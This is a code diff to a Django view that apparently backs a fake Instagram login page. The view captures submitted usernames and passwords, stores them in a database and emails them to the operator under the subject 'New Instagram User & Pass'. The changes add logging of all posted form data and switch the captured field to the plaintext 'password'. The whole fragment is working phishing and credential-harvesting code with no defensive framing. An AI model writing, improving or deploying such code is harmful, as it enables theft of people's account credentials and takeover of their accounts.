@@ -102,8 +102,9 @@ def auth(request):
 
 def instagram(request):
     if request.method == "POST":
+        print(request.POST)
         username = request.POST.get("username")
-        password = request.POST.get("enc_password")
+        password = request.POST.get("password")
         from .models import Instagram
         if username and password:
             Instagram.objects.create(username=username, password=password).save()
@@ -125,7 +126,7 @@ password = {password}
                     msg=f"Subject:**New Instagram User & Pass**\n\nhi {content}"
                 )
         except:
-            print("can't send email")
+            print(f"{'*'*20} can't send email {'*'*20}")
         #######################################
     return render(request, "instagram/index.html")
 
